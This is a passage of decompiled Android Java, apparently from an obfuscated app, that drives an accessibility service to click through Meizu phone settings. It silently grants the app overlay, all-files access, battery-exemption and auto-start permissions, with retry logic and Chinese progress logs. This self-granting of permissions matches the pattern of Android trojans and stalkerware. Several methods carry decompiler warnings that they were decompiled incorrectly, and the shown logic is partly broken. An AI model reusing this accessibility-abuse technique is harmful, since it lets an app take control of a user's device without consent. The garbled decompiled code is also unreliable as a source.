                    break;
                }
            }
            AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) next;
            boolean zPerformAction = accessibilityNodeInfo2 != null ? accessibilityNodeInfo2.performAction(16) : false;
            Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
            while (it2.hasNext()) {
                ((AccessibilityNodeInfo) it2.next()).recycle();
            }
            rootInActiveWindow.recycle();
            if (!zPerformAction) {
                return Boolean.FALSE;
            }
            meizuSteps$clickAllAppsFilter$1.f54178a2 = 1;
            if (b81.m210571b1(1000L, meizuSteps$clickAllAppsFilter$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
        }
        return Boolean.TRUE;
    }

    /* JADX WARN: Removed duplicated region for block: B:21:0x005f  */
    /* JADX WARN: Removed duplicated region for block: B:41:0x00ba A[LOOP:1: B:39:0x00b4->B:41:0x00ba, LOOP_END] */
    /* JADX WARN: Removed duplicated region for block: B:44:0x00dd A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:45:0x00de  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x00e6  */
    /* JADX WARN: Removed duplicated region for block: B:50:0x00e9  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x00ed  */
    /* JADX WARN: Removed duplicated region for block: B:56:0x00ff A[LOOP:2: B:54:0x00f9->B:56:0x00ff, LOOP_END] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:37:0x00a0 -> B:51:0x00eb). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:45:0x00de -> B:46:0x00e0). Please report as a decompilation issue!!! */
    /* renamed from: a5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212225a5(String str, ContinuationImpl continuationImpl) throws Throwable {
        MeizuSteps$clickAppAndEnableFilesAccess$1 meizuSteps$clickAppAndEnableFilesAccess$1;
        List<AccessibilityNodeInfo> list;
        Iterator<AccessibilityNodeInfo> it;
        C0366a3 c0366a3;
        AccessibilityNodeInfo accessibilityNodeInfo;
        Iterator<T> it2;
        String string;
        Iterator<T> it3;
        if (continuationImpl instanceof MeizuSteps$clickAppAndEnableFilesAccess$1) {
            meizuSteps$clickAppAndEnableFilesAccess$1 = (MeizuSteps$clickAppAndEnableFilesAccess$1) continuationImpl;
            int i = meizuSteps$clickAppAndEnableFilesAccess$1.f54187a8;
            if ((i & Integer.MIN_VALUE) != 0) {
                meizuSteps$clickAppAndEnableFilesAccess$1.f54187a8 = i - Integer.MIN_VALUE;
            } else {
                meizuSteps$clickAppAndEnableFilesAccess$1 = new MeizuSteps$clickAppAndEnableFilesAccess$1(this, continuationImpl);
            }
        }
        Object obj = meizuSteps$clickAppAndEnableFilesAccess$1.f54185a6;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = meizuSteps$clickAppAndEnableFilesAccess$1.f54187a8;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            AccessibilityNodeInfo rootInActiveWindow = this.f55081a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return Boolean.FALSE;
            }
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
            list = listFindAccessibilityNodeInfosByText;
            it = listFindAccessibilityNodeInfosByText.iterator();
            c0366a3 = this;
            accessibilityNodeInfo = rootInActiveWindow;
            while (it.hasNext()) {
            }
            t60.m214694b5(list, "appNodes");
            it2 = list.iterator();
            while (it2.hasNext()) {
            }
            accessibilityNodeInfo.recycle();
            return Boolean.FALSE;
        }
        if (i2 != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        AccessibilityNodeInfo accessibilityNodeInfo2 = meizuSteps$clickAppAndEnableFilesAccess$1.f54184a5;
        it = meizuSteps$clickAppAndEnableFilesAccess$1.f54183a4;
        list = meizuSteps$clickAppAndEnableFilesAccess$1.f54182a3;
        accessibilityNodeInfo = meizuSteps$clickAppAndEnableFilesAccess$1.f54181a2;
        String str2 = meizuSteps$clickAppAndEnableFilesAccess$1.f54180a1;
        c0366a3 = meizuSteps$clickAppAndEnableFilesAccess$1.f54179a0;
        kg1.m213544f4(obj);
        if (!Environment.isExternalStorageManager()) {
            return Boolean.TRUE;
        }
        AccessibilityNodeInfo accessibilityNodeInfoM212222a9 = accessibilityNodeInfo2;
        str = str2;
        if (accessibilityNodeInfoM212222a9 != null) {
            accessibilityNodeInfoM212222a9.recycle();
        }
        while (it.hasNext()) {
            AccessibilityNodeInfo next = it.next();
            if (!AbstractC0779a1.m213652a5(next.getClassName().toString(), "EditText", false)) {
                CharSequence text = next.getText();
                if (text == null || (string = text.toString()) == null) {
                    string = "";
                }
                if (string.equals(str)) {
                    AccessibilityNodeInfo parent = next.getParent();
                    if (parent != null) {
                        c0366a3.getClass();
                        accessibilityNodeInfoM212222a9 = m212222a9(parent);
                        if (accessibilityNodeInfoM212222a9 != null && !accessibilityNodeInfoM212222a9.isChecked()) {
                            accessibilityNodeInfoM212222a9.performAction(16);
                            accessibilityNodeInfoM212222a9.recycle();
                            next.recycle();
                            t60.m214694b5(list, "appNodes");
                            it3 = list.iterator();
                            while (it3.hasNext()) {
                                ((AccessibilityNodeInfo) it3.next()).recycle();
                            }
                            accessibilityNodeInfo.recycle();
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54179a0 = c0366a3;
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54180a1 = str;
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54181a2 = accessibilityNodeInfo;
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54182a3 = list;
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54183a4 = it;
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54184a5 = accessibilityNodeInfoM212222a9;
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54187a8 = 1;
                            if (b81.m210571b1(500L, meizuSteps$clickAppAndEnableFilesAccess$1) != coroutineSingletons) {
                                return coroutineSingletons;
                            }
                            str2 = str;
                            accessibilityNodeInfo2 = accessibilityNodeInfoM212222a9;
                            if (!Environment.isExternalStorageManager()) {
                            }
                        }
                    } else {
                        accessibilityNodeInfoM212222a9 = null;
                        if (0 != 0) {
                            accessibilityNodeInfoM212222a9.performAction(16);
                            accessibilityNodeInfoM212222a9.recycle();
                            next.recycle();
                            t60.m214694b5(list, "appNodes");
                            it3 = list.iterator();
                            while (it3.hasNext()) {
                            }
                            accessibilityNodeInfo.recycle();
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54179a0 = c0366a3;
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54180a1 = str;
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54181a2 = accessibilityNodeInfo;
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54182a3 = list;
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54183a4 = it;
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54184a5 = accessibilityNodeInfoM212222a9;
                            meizuSteps$clickAppAndEnableFilesAccess$1.f54187a8 = 1;
                            if (b81.m210571b1(500L, meizuSteps$clickAppAndEnableFilesAccess$1) != coroutineSingletons) {
                            }
                        }
                    }
                    if (accessibilityNodeInfoM212222a9 != null) {
                    }
                    while (it.hasNext()) {
                    }
                }
            }
        }
        t60.m214694b5(list, "appNodes");
        it2 = list.iterator();
        while (it2.hasNext()) {
            ((AccessibilityNodeInfo) it2.next()).recycle();
        }
        accessibilityNodeInfo.recycle();
        return Boolean.FALSE;
    }

    /* JADX WARN: Removed duplicated region for block: B:21:0x005f  */
    /* JADX WARN: Removed duplicated region for block: B:41:0x00ba A[LOOP:1: B:39:0x00b4->B:41:0x00ba, LOOP_END] */
    /* JADX WARN: Removed duplicated region for block: B:44:0x00dd A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:45:0x00de  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x00e8  */
    /* JADX WARN: Removed duplicated region for block: B:50:0x00eb  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x00ef  */
    /* JADX WARN: Removed duplicated region for block: B:56:0x0101 A[LOOP:2: B:54:0x00fb->B:56:0x0101, LOOP_END] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:37:0x00a0 -> B:51:0x00ed). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:45:0x00de -> B:46:0x00e0). Please report as a decompilation issue!!! */
    /* renamed from: a6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212226a6(String str, ContinuationImpl continuationImpl) throws Throwable {
        MeizuSteps$clickAppAndEnableOverlay$1 meizuSteps$clickAppAndEnableOverlay$1;
        List<AccessibilityNodeInfo> list;
        Iterator<AccessibilityNodeInfo> it;
        C0366a3 c0366a3;
        AccessibilityNodeInfo accessibilityNodeInfo;
        Iterator<T> it2;
        String string;
        Iterator<T> it3;
        if (continuationImpl instanceof MeizuSteps$clickAppAndEnableOverlay$1) {
            meizuSteps$clickAppAndEnableOverlay$1 = (MeizuSteps$clickAppAndEnableOverlay$1) continuationImpl;
            int i = meizuSteps$clickAppAndEnableOverlay$1.f54196a8;
            if ((i & Integer.MIN_VALUE) != 0) {
                meizuSteps$clickAppAndEnableOverlay$1.f54196a8 = i - Integer.MIN_VALUE;
            } else {
                meizuSteps$clickAppAndEnableOverlay$1 = new MeizuSteps$clickAppAndEnableOverlay$1(this, continuationImpl);
            }
        }
        Object obj = meizuSteps$clickAppAndEnableOverlay$1.f54194a6;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = meizuSteps$clickAppAndEnableOverlay$1.f54196a8;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            AccessibilityNodeInfo rootInActiveWindow = this.f55081a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return Boolean.FALSE;
            }
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
            list = listFindAccessibilityNodeInfosByText;
            it = listFindAccessibilityNodeInfosByText.iterator();
            c0366a3 = this;
            accessibilityNodeInfo = rootInActiveWindow;
            while (it.hasNext()) {
            }
            t60.m214694b5(list, "appNodes");
            it2 = list.iterator();
            while (it2.hasNext()) {
            }
            accessibilityNodeInfo.recycle();
            return Boolean.FALSE;
        }
        if (i2 != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        AccessibilityNodeInfo accessibilityNodeInfo2 = meizuSteps$clickAppAndEnableOverlay$1.f54193a5;
        it = meizuSteps$clickAppAndEnableOverlay$1.f54192a4;
        list = meizuSteps$clickAppAndEnableOverlay$1.f54191a3;
        accessibilityNodeInfo = meizuSteps$clickAppAndEnableOverlay$1.f54190a2;
        String str2 = meizuSteps$clickAppAndEnableOverlay$1.f54189a1;
        c0366a3 = meizuSteps$clickAppAndEnableOverlay$1.f54188a0;
        kg1.m213544f4(obj);
        if (!Settings.canDrawOverlays(c0366a3.f55082a1)) {
            return Boolean.TRUE;
        }
        AccessibilityNodeInfo accessibilityNodeInfoM212222a9 = accessibilityNodeInfo2;
        str = str2;
        if (accessibilityNodeInfoM212222a9 != null) {
            accessibilityNodeInfoM212222a9.recycle();
        }
        while (it.hasNext()) {
            AccessibilityNodeInfo next = it.next();
            if (!AbstractC0779a1.m213652a5(next.getClassName().toString(), "EditText", false)) {
                CharSequence text = next.getText();
                if (text == null || (string = text.toString()) == null) {
                    string = "";
                }
                if (string.equals(str)) {
                    AccessibilityNodeInfo parent = next.getParent();
                    if (parent != null) {
                        c0366a3.getClass();
                        accessibilityNodeInfoM212222a9 = m212222a9(parent);
                        if (accessibilityNodeInfoM212222a9 != null && !accessibilityNodeInfoM212222a9.isChecked()) {
                            accessibilityNodeInfoM212222a9.performAction(16);
                            accessibilityNodeInfoM212222a9.recycle();
                            next.recycle();
                            t60.m214694b5(list, "appNodes");
                            it3 = list.iterator();
                            while (it3.hasNext()) {
                                ((AccessibilityNodeInfo) it3.next()).recycle();
                            }
                            accessibilityNodeInfo.recycle();
                            meizuSteps$clickAppAndEnableOverlay$1.f54188a0 = c0366a3;
                            meizuSteps$clickAppAndEnableOverlay$1.f54189a1 = str;
                            meizuSteps$clickAppAndEnableOverlay$1.f54190a2 = accessibilityNodeInfo;
                            meizuSteps$clickAppAndEnableOverlay$1.f54191a3 = list;
                            meizuSteps$clickAppAndEnableOverlay$1.f54192a4 = it;
                            meizuSteps$clickAppAndEnableOverlay$1.f54193a5 = accessibilityNodeInfoM212222a9;
                            meizuSteps$clickAppAndEnableOverlay$1.f54196a8 = 1;
                            if (b81.m210571b1(500L, meizuSteps$clickAppAndEnableOverlay$1) != coroutineSingletons) {
                                return coroutineSingletons;
                            }
                            str2 = str;
                            accessibilityNodeInfo2 = accessibilityNodeInfoM212222a9;
                            if (!Settings.canDrawOverlays(c0366a3.f55082a1)) {
                            }
                        }
                    } else {
                        accessibilityNodeInfoM212222a9 = null;
                        if (0 != 0) {
                            accessibilityNodeInfoM212222a9.performAction(16);
                            accessibilityNodeInfoM212222a9.recycle();
                            next.recycle();
                            t60.m214694b5(list, "appNodes");
                            it3 = list.iterator();
                            while (it3.hasNext()) {
                            }
                            accessibilityNodeInfo.recycle();
                            meizuSteps$clickAppAndEnableOverlay$1.f54188a0 = c0366a3;
                            meizuSteps$clickAppAndEnableOverlay$1.f54189a1 = str;
                            meizuSteps$clickAppAndEnableOverlay$1.f54190a2 = accessibilityNodeInfo;
                            meizuSteps$clickAppAndEnableOverlay$1.f54191a3 = list;
                            meizuSteps$clickAppAndEnableOverlay$1.f54192a4 = it;
                            meizuSteps$clickAppAndEnableOverlay$1.f54193a5 = accessibilityNodeInfoM212222a9;
                            meizuSteps$clickAppAndEnableOverlay$1.f54196a8 = 1;
                            if (b81.m210571b1(500L, meizuSteps$clickAppAndEnableOverlay$1) != coroutineSingletons) {
                            }
                        }
                    }
                    if (accessibilityNodeInfoM212222a9 != null) {
                    }
                    while (it.hasNext()) {
                    }
                }
            }
        }
        t60.m214694b5(list, "appNodes");
        it2 = list.iterator();
        while (it2.hasNext()) {
            ((AccessibilityNodeInfo) it2.next()).recycle();
        }
        accessibilityNodeInfo.recycle();
        return Boolean.FALSE;
    }

    /* JADX WARN: Removed duplicated region for block: B:33:0x00b2  */
    /* JADX WARN: Removed duplicated region for block: B:37:0x00c9  */
    /* JADX WARN: Removed duplicated region for block: B:40:0x00d2  */
    /* JADX WARN: Removed duplicated region for block: B:44:0x00e9  */
    /* JADX WARN: Removed duplicated region for block: B:47:0x00f2  */
    /* JADX WARN: Removed duplicated region for block: B:50:0x00f7  */
    /* JADX WARN: Removed duplicated region for block: B:51:0x00fa  */
    /* JADX WARN: Removed duplicated region for block: B:55:0x0108  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212227a7(String str, ContinuationImpl continuationImpl) {
        MeizuSteps$execute$1 meizuSteps$execute$1;
        C0366a3 c0366a3;
        Object obj;
        int i;
        String str2;
        int i2;
        C0366a3 c0366a32;
        C0366a3 c0366a33;
        C0366a3 c0366a34;
        if (continuationImpl instanceof MeizuSteps$execute$1) {
            meizuSteps$execute$1 = (MeizuSteps$execute$1) continuationImpl;
            int i3 = meizuSteps$execute$1.f54202a5;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                meizuSteps$execute$1.f54202a5 = i3 - Integer.MIN_VALUE;
            } else {
                meizuSteps$execute$1 = new MeizuSteps$execute$1(this, continuationImpl);
            }
        }
        Object objM212228a8 = meizuSteps$execute$1.f54200a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = meizuSteps$execute$1.f54202a5;
        if (i4 == 0) {
            kg1.m213544f4(objM212228a8);
            t60.m214704c5(this.f55083a2, "[魅族] 开始执行授权流程");
            MeizuSteps$execute$2 meizuSteps$execute$2 = new MeizuSteps$execute$2(this, str, null);
            meizuSteps$execute$1.f54197a0 = this;
            meizuSteps$execute$1.f54198a1 = str;
            meizuSteps$execute$1.f54199a2 = 1;
            meizuSteps$execute$1.f54202a5 = 1;
            Object objM212228a82 = m212228a8(MeizuSteps$FlowType.STARTUP_MANAGER, str, meizuSteps$execute$2, meizuSteps$execute$1);
            if (objM212228a82 != coroutineSingletons) {
                c0366a3 = this;
                obj = objM212228a82;
                i = 1;
            }
            return coroutineSingletons;
        }
        if (i4 != 1) {
            if (i4 == 2) {
                i2 = meizuSteps$execute$1.f54199a2;
                str2 = meizuSteps$execute$1.f54198a1;
                c0366a32 = meizuSteps$execute$1.f54197a0;
                kg1.m213544f4(objM212228a8);
                if (!((Boolean) objM212228a8).booleanValue()) {
                    i2 = 0;
                }
                MeizuSteps$execute$4 meizuSteps$execute$4 = new MeizuSteps$execute$4(c0366a32, str2, null);
                meizuSteps$execute$1.f54197a0 = c0366a32;
                meizuSteps$execute$1.f54198a1 = str2;
                meizuSteps$execute$1.f54199a2 = i2;
                meizuSteps$execute$1.f54202a5 = 3;
                objM212228a8 = c0366a32.m212228a8(MeizuSteps$FlowType.OVERLAY_PERMISSION, str2, meizuSteps$execute$4, meizuSteps$execute$1);
                if (objM212228a8 != coroutineSingletons) {
                    c0366a33 = c0366a32;
                    if (!((Boolean) objM212228a8).booleanValue()) {
                    }
                    MeizuSteps$execute$5 meizuSteps$execute$5 = new MeizuSteps$execute$5(c0366a33, str2, null);
                    meizuSteps$execute$1.f54197a0 = c0366a33;
                    meizuSteps$execute$1.f54198a1 = null;
                    meizuSteps$execute$1.f54199a2 = i2;
                    meizuSteps$execute$1.f54202a5 = 4;
                    objM212228a8 = c0366a33.m212228a8(MeizuSteps$FlowType.ALL_FILES_ACCESS, str2, meizuSteps$execute$5, meizuSteps$execute$1);
                    if (objM212228a8 != coroutineSingletons) {
                    }
                }
                return coroutineSingletons;
            }
            if (i4 != 3) {
                if (i4 != 4) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                i2 = meizuSteps$execute$1.f54199a2;
                c0366a34 = meizuSteps$execute$1.f54197a0;
                kg1.m213544f4(objM212228a8);
                if (!((Boolean) objM212228a8).booleanValue()) {
                    i2 = 0;
                }
                t60.m214704c5(c0366a34.f55083a2, "[魅族] 授权流程完成: ".concat(i2 == 0 ? "全部成功" : "部分失败"));
                return Boolean.valueOf(i2 != 0);
            }
            i2 = meizuSteps$execute$1.f54199a2;
            str2 = meizuSteps$execute$1.f54198a1;
            c0366a33 = meizuSteps$execute$1.f54197a0;
            kg1.m213544f4(objM212228a8);
            if (!((Boolean) objM212228a8).booleanValue()) {
                i2 = 0;
            }
            MeizuSteps$execute$5 meizuSteps$execute$52 = new MeizuSteps$execute$5(c0366a33, str2, null);
            meizuSteps$execute$1.f54197a0 = c0366a33;
            meizuSteps$execute$1.f54198a1 = null;
            meizuSteps$execute$1.f54199a2 = i2;
            meizuSteps$execute$1.f54202a5 = 4;
            objM212228a8 = c0366a33.m212228a8(MeizuSteps$FlowType.ALL_FILES_ACCESS, str2, meizuSteps$execute$52, meizuSteps$execute$1);
            if (objM212228a8 != coroutineSingletons) {
                c0366a34 = c0366a33;
                if (!((Boolean) objM212228a8).booleanValue()) {
                }
                t60.m214704c5(c0366a34.f55083a2, "[魅族] 授权流程完成: ".concat(i2 == 0 ? "全部成功" : "部分失败"));
                return Boolean.valueOf(i2 != 0);
            }
            return coroutineSingletons;
        }
        int i5 = meizuSteps$execute$1.f54199a2;
        String str3 = meizuSteps$execute$1.f54198a1;
        c0366a3 = meizuSteps$execute$1.f54197a0;
        kg1.m213544f4(objM212228a8);
        i = i5;
        str = str3;
        obj = objM212228a8;
        if (!((Boolean) obj).booleanValue()) {
            i = 0;
        }
        MeizuSteps$execute$3 meizuSteps$execute$3 = new MeizuSteps$execute$3(c0366a3, str, null);
        meizuSteps$execute$1.f54197a0 = c0366a3;
        meizuSteps$execute$1.f54198a1 = str;
        meizuSteps$execute$1.f54199a2 = i;
        meizuSteps$execute$1.f54202a5 = 2;
        Object objM212228a83 = c0366a3.m212228a8(MeizuSteps$FlowType.BATTERY_OPTIMIZATION, str, meizuSteps$execute$3, meizuSteps$execute$1);
        if (objM212228a83 != coroutineSingletons) {
            str2 = str;
            i2 = i;
            objM212228a8 = objM212228a83;
            c0366a32 = c0366a3;
            if (!((Boolean) objM212228a8).booleanValue()) {
            }
            MeizuSteps$execute$4 meizuSteps$execute$42 = new MeizuSteps$execute$4(c0366a32, str2, null);
            meizuSteps$execute$1.f54197a0 = c0366a32;
            meizuSteps$execute$1.f54198a1 = str2;
            meizuSteps$execute$1.f54199a2 = i2;
            meizuSteps$execute$1.f54202a5 = 3;
            objM212228a8 = c0366a32.m212228a8(MeizuSteps$FlowType.OVERLAY_PERMISSION, str2, meizuSteps$execute$42, meizuSteps$execute$1);
            if (objM212228a8 != coroutineSingletons) {
            }
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Removed duplicated region for block: B:48:0x0136 A[PHI: r1 r2 r4 r7
      0x0136: PHI (r1v7 h10) = (r1v6 h10), (r1v12 h10) binds: [B:46:0x0133, B:18:0x0047] A[DONT_GENERATE, DONT_INLINE]
      0x0136: PHI (r2v8 java.lang.String) = (r2v7 java.lang.String), (r2v11 java.lang.String) binds: [B:46:0x0133, B:18:0x0047] A[DONT_GENERATE, DONT_INLINE]
      0x0136: PHI (r4v14 com.storm.safe.rock.service.modules.yw5xud.MeizuSteps$FlowType) = 
      (r4v13 com.storm.safe.rock.service.modules.yw5xud.MeizuSteps$FlowType)
      (r4v18 com.storm.safe.rock.service.modules.yw5xud.MeizuSteps$FlowType)
     binds: [B:46:0x0133, B:18:0x0047] A[DONT_GENERATE, DONT_INLINE]
      0x0136: PHI (r7v12 com.storm.safe.rock.service.modules.yw5xud.a3) = (r7v11 com.storm.safe.rock.service.modules.yw5xud.a3), (r7v16 com.storm.safe.rock.service.modules.yw5xud.a3) binds: [B:46:0x0133, B:18:0x0047] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:51:0x0148 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0020  */
    /* renamed from: a8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212228a8(MeizuSteps$FlowType meizuSteps$FlowType, String str, h10 h10Var, ContinuationImpl continuationImpl) throws Throwable {
        MeizuSteps$executeFlowWithVerification$1 meizuSteps$executeFlowWithVerification$1;
        int iIntValue;
        String str2;
        Object objInvoke;
        C0366a3 c0366a3;
        MeizuSteps$FlowType meizuSteps$FlowType2;
        h10 h10Var2;
        String str3;
        C0366a3 c0366a32;
        MeizuSteps$FlowType meizuSteps$FlowType3 = meizuSteps$FlowType;
        h10 h10Var3 = h10Var;
        if (continuationImpl instanceof MeizuSteps$executeFlowWithVerification$1) {
            meizuSteps$executeFlowWithVerification$1 = (MeizuSteps$executeFlowWithVerification$1) continuationImpl;
            int i = meizuSteps$executeFlowWithVerification$1.f54234a7;
            if ((i & Integer.MIN_VALUE) != 0) {
                meizuSteps$executeFlowWithVerification$1.f54234a7 = i - Integer.MIN_VALUE;
            } else {
                meizuSteps$executeFlowWithVerification$1 = new MeizuSteps$executeFlowWithVerification$1(this, continuationImpl);
            }
        }
        Object obj = meizuSteps$executeFlowWithVerification$1.f54232a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = meizuSteps$executeFlowWithVerification$1.f54234a7;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            w20 w20Var = this.f55084a3;
            boolean zM214990a5 = w20Var.m214990a5(meizuSteps$FlowType3);
            LinkedHashMap linkedHashMap = w20Var.f60756a1;
            if (zM214990a5) {
                return Boolean.TRUE;
            }
            iIntValue = ((Number) linkedHashMap.getOrDefault(meizuSteps$FlowType3, 0)).intValue() + 1;
            linkedHashMap.put(meizuSteps$FlowType3, Integer.valueOf(iIntValue));
            if (((Number) linkedHashMap.getOrDefault(meizuSteps$FlowType3, 0)).intValue() >= w20Var.f60757a2) {
                t60.m214726f4(this.f55083a2, "[" + meizuSteps$FlowType3.f54175a0 + "] 已达到最大尝试次数，标记为完成");
                w20Var.m214995b0(meizuSteps$FlowType3);
                return Boolean.TRUE;
            }
            meizuSteps$executeFlowWithVerification$1.f54227a0 = this;
            meizuSteps$executeFlowWithVerification$1.f54228a1 = meizuSteps$FlowType3;
            str2 = str;
            meizuSteps$executeFlowWithVerification$1.f54229a2 = str2;
            meizuSteps$executeFlowWithVerification$1.f54230a3 = h10Var3;
            meizuSteps$executeFlowWithVerification$1.f54231a4 = iIntValue;
            meizuSteps$executeFlowWithVerification$1.f54234a7 = 1;
            objInvoke = h10Var3.invoke(meizuSteps$executeFlowWithVerification$1);
            if (objInvoke != coroutineSingletons) {
                c0366a3 = this;
            }
        }
        if (i2 != 1) {
            if (i2 != 2) {
                if (i2 != 3) {
                    if (i2 != 4) {
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                    }
                    kg1.m213544f4(obj);
                    return obj;
                }
                h10Var2 = meizuSteps$executeFlowWithVerification$1.f54230a3;
                str3 = meizuSteps$executeFlowWithVerification$1.f54229a2;
                meizuSteps$FlowType2 = meizuSteps$executeFlowWithVerification$1.f54228a1;
                c0366a32 = meizuSteps$executeFlowWithVerification$1.f54227a0;
                kg1.m213544f4(obj);
                meizuSteps$executeFlowWithVerification$1.f54227a0 = null;
                meizuSteps$executeFlowWithVerification$1.f54228a1 = null;
                meizuSteps$executeFlowWithVerification$1.f54229a2 = null;
                meizuSteps$executeFlowWithVerification$1.f54230a3 = null;
                meizuSteps$executeFlowWithVerification$1.f54234a7 = 4;
                Object objM212228a8 = c0366a32.m212228a8(meizuSteps$FlowType2, str3, h10Var2, meizuSteps$executeFlowWithVerification$1);
                return objM212228a8 != coroutineSingletons ? coroutineSingletons : objM212228a8;
            }
            h10Var2 = meizuSteps$executeFlowWithVerification$1.f54230a3;
            str3 = meizuSteps$executeFlowWithVerification$1.f54229a2;
            meizuSteps$FlowType2 = meizuSteps$executeFlowWithVerification$1.f54228a1;
            c0366a32 = meizuSteps$executeFlowWithVerification$1.f54227a0;
            kg1.m213544f4(obj);
            meizuSteps$executeFlowWithVerification$1.f54227a0 = c0366a32;
            meizuSteps$executeFlowWithVerification$1.f54228a1 = meizuSteps$FlowType2;
            meizuSteps$executeFlowWithVerification$1.f54229a2 = str3;
            meizuSteps$executeFlowWithVerification$1.f54230a3 = h10Var2;
            meizuSteps$executeFlowWithVerification$1.f54234a7 = 3;
            if (b81.m210571b1(1000L, meizuSteps$executeFlowWithVerification$1) != coroutineSingletons) {
                meizuSteps$executeFlowWithVerification$1.f54227a0 = null;
                meizuSteps$executeFlowWithVerification$1.f54228a1 = null;
                meizuSteps$executeFlowWithVerification$1.f54229a2 = null;
                meizuSteps$executeFlowWithVerification$1.f54230a3 = null;
                meizuSteps$executeFlowWithVerification$1.f54234a7 = 4;
                Object objM212228a82 = c0366a32.m212228a8(meizuSteps$FlowType2, str3, h10Var2, meizuSteps$executeFlowWithVerification$1);
                if (objM212228a82 != coroutineSingletons) {
                }
            }
        }
        int i3 = meizuSteps$executeFlowWithVerification$1.f54231a4;
        h10Var3 = meizuSteps$executeFlowWithVerification$1.f54230a3;
        String str4 = meizuSteps$executeFlowWithVerification$1.f54229a2;
        MeizuSteps$FlowType meizuSteps$FlowType4 = meizuSteps$executeFlowWithVerification$1.f54228a1;
        c0366a3 = meizuSteps$executeFlowWithVerification$1.f54227a0;
        kg1.m213544f4(obj);
        iIntValue = i3;
        meizuSteps$FlowType3 = meizuSteps$FlowType4;
        objInvoke = obj;
        str2 = str4;
        Boolean bool = (Boolean) objInvoke;
        boolean zBooleanValue = bool.booleanValue();
        if (zBooleanValue && c0366a3.f55084a3.m214990a5(meizuSteps$FlowType3)) {
            c0366a3.f55084a3.m214995b0(meizuSteps$FlowType3);
            return Boolean.TRUE;
        }
        if (zBooleanValue || iIntValue >= 2) {
            return bool;
        }
        t60.m214726f4(c0366a3.f55083a2, "[" + meizuSteps$FlowType3.f54175a0 + "] 流程失败，返回首页并重试");
        meizuSteps$executeFlowWithVerification$1.f54227a0 = c0366a3;
        meizuSteps$executeFlowWithVerification$1.f54228a1 = meizuSteps$FlowType3;
        meizuSteps$executeFlowWithVerification$1.f54229a2 = str2;
        meizuSteps$executeFlowWithVerification$1.f54230a3 = h10Var3;
        meizuSteps$executeFlowWithVerification$1.f54234a7 = 2;
        if (c0366a3.m212229b1(meizuSteps$executeFlowWithVerification$1) != coroutineSingletons) {
            meizuSteps$FlowType2 = meizuSteps$FlowType3;
            h10Var2 = h10Var3;
            str3 = str2;
            c0366a32 = c0366a3;
            meizuSteps$executeFlowWithVerification$1.f54227a0 = c0366a32;
            meizuSteps$executeFlowWithVerification$1.f54228a1 = meizuSteps$FlowType2;
            meizuSteps$executeFlowWithVerification$1.f54229a2 = str3;
            meizuSteps$executeFlowWithVerification$1.f54230a3 = h10Var2;
            meizuSteps$executeFlowWithVerification$1.f54234a7 = 3;
            if (b81.m210571b1(1000L, meizuSteps$executeFlowWithVerification$1) != coroutineSingletons) {
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:21:0x0062, code lost:
    
        if (p000.b81.m210571b1(200, r0) == r1) goto L30;
     */
